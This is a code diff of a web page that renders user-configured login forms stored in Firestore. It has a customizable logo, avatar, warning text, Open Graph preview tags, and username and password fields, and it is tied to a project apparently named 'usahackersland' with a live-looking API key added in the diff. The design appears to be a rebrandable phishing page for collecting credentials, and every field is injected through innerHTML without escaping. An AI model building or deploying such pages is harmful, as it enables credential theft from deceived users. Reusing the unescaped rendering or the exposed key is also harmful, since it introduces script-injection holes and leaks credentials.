@@ -68,78 +68,101 @@ footer{
 <div class="container" id="app">Loading…</div>
 
 <script>
-/* FIREBASE CONFIG */
+/* 🔥 YOUR FIREBASE CONFIG (AS PROVIDED) */
 firebase.initializeApp({
-  apiKey:"REPLACE",
-  authDomain:"REPLACE",
-  projectId:"REPLACE"
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland"
 });
-const db=firebase.firestore();
 
-/* UTIL */
-const $=q=>document.querySelector(q);
-const linkify=t=>(t||"").replace(/(https?:\/\/[^\s]+)/g,'<a href="$1" target="_blank">$1</a>');
+const db = firebase.firestore();
 
-/* GET FORM ID */
-const id=location.pathname.split("/").pop();
+/* UTILITIES */
+const $ = q => document.querySelector(q);
+const linkify = t => (t || "").replace(
+  /(https?:\/\/[^\s]+)/g,
+  '<a href="$1" target="_blank">$1</a>'
+);
 
-/* LOAD FORM */
-db.collection("forms").doc(id).get().then(d=>{
-if(!d.exists){$("#app").innerHTML="Form not found";return;}
-const f=d.data();
+/* GET FORM ID FROM /f/<id> */
+const formId = location.pathname.split("/").pop();
 
-/* SEO */
-if(f.seo){
-document.title=f.seo.title||"";
-$("#metaDesc").content=f.seo.desc||"";
-$("#ogTitle").content=f.seo.title||"";
-$("#ogDesc").content=f.seo.desc||"";
-$("#ogImage").content=f.seo.og||"";
-}
+/* LOAD FORM DATA */
+db.collection("forms").doc(formId).get().then(doc=>{
+  if(!doc.exists){
+    $("#app").innerHTML = "Form not found";
+    return;
+  }
 
-/* BUILD */
-let html="";
+  const f = doc.data();
 
-/* AVATAR */
-if(f.avatarURL){
-html+=`<img src="${f.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto" ${f.avatarClickable?'onclick="window.open(\''+f.avatarURL+'\')"':""}>`;
-}
+  /* SEO / OG */
+  if(f.seo){
+    document.title = f.seo.title || "";
+    $("#metaDesc").content = f.seo.desc || "";
+    $("#ogTitle").content = f.seo.title || "";
+    $("#ogDesc").content = f.seo.desc || "";
+    $("#ogImage").content = f.seo.og || "";
+  }
 
-/* LOGO */
-if(f.logoURL){
-html+=`<img src="${f.logoURL}" style="width:140px;display:block;margin:10px auto" ${f.logoClickable?'onclick="window.open(\''+f.logoURL+'\')"':""}>`;
-}
+  let html = "";
 
-/* TITLE */
-if(f.title)html+=`<h2 style="text-align:center">${f.title}</h2>`;
-if(f.subtitle)html+=`<p style="text-align:center;color:#555">${f.subtitle}</p>`;
+  /* AVATAR */
+  if(f.avatarURL){
+    html += `
+      <img src="${f.avatarURL}"
+        style="width:90px;border-radius:50%;display:block;margin:auto"
+        ${f.avatarClickable ? `onclick="window.open('${f.avatarURL}')"` : ""}>
+    `;
+  }
 
-/* DESCRIPTION */
-if(f.description)html+=`<p>${linkify(f.description)}</p>`;
+  /* LOGO */
+  if(f.logoURL){
+    html += `
+      <img src="${f.logoURL}"
+        style="width:140px;display:block;margin:10px auto"
+        ${f.logoClickable ? `onclick="window.open('${f.logoURL}')"` : ""}>
+    `;
+  }
 
-/* WARNING */
-if(f.warning){
-html+=`<p class="warning" style="text-align:${f.warningPosition||'left'}">${linkify(f.warning)}</p>`;
-}
+  /* TITLE + SUBTITLE */
+  if(f.title) html += `<h2 style="text-align:center">${f.title}</h2>`;
+  if(f.subtitle) html += `<p style="text-align:center;color:#555">${f.subtitle}</p>`;
 
-/* AUTH */
-html+=`<input placeholder="Username or Email">`;
-html+=`<input type="password" placeholder="Password">`;
+  /* DESCRIPTION */
+  if(f.description){
+    html += `<p>${linkify(f.description)}</p>`;
+  }
 
-/* EXTRA FIELDS */
-if(f.extraFields){
-f.extraFields.split("\n").forEach(v=>{
-if(v.trim())html+=`<input placeholder="${v.trim()}">`;
-});
-}
+  /* WARNING */
+  if(f.warning){
+    html += `
+      <p class="warning" style="text-align:${f.warningPosition || 'left'}">
+        ${linkify(f.warning)}
+      </p>
+    `;
+  }
 
-/* MAIN BUTTON */
-html+=`<button>${f.buttonText||"Continue"}</button>`;
+  /* AUTH FIELDS */
+  html += `<input placeholder="Username or Email">`;
+  html += `<input type="password" placeholder="Password">`;
 
-/* FOOTER */
-if(f.footerText)html+=`<footer>${f.footerText}</footer>`;
+  /* EXTRA FIELDS */
+  if(f.extraFields){
+    f.extraFields.forEach(v=>{
+      if(v) html += `<input placeholder="${v}">`;
+    });
+  }
 
-$("#app").innerHTML=html;
+  /* MAIN BUTTON */
+  html += `<button>${f.buttonText || "Continue"}</button>`;
+
+  /* FOOTER */
+  if(f.footerText){
+    html += `<footer>${f.footerText}</footer>`;
+  }
+
+  $("#app").innerHTML = html;
 });
 </script>
 </body>
